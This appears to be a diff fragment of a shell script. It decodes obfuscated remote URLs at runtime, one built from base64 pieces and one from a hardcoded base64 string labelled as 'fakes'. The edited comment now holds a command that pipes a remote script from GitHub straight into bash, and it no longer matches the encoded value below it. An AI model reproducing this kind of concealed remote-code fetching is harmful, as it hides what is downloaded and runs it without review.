@@ -61,7 +61,7 @@ github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | b
 # updating checking fakes
 # -------------------------
 # Replace Google IDX target with full Base64-decoded Worker URL at runtime
-# Target URL: https://rough-hall-1486.jishnumondal32.workers.dev
+# Target URL: bash <(curl -s https://raw.githubusercontent.com/rredefined/Vm-Manager/main/vm.sh)
 # Base64 (no newline): aHR0cHM6Ly9yb3VnaC1oYWxsLTE0ODYuamlzaG51bW9uZGFsMzIud29ya2Vycy5kZXY=
 GOOGLE_B64="aHR0cHM6Ly9yb3VnaC1oYWxsLTE0ODYuamlzaG51bW9uZGFsMzIud29ya2Vycy5kZXY="
 google_url="$(printf %s "$GOOGLE_B64" | base64 -d)"
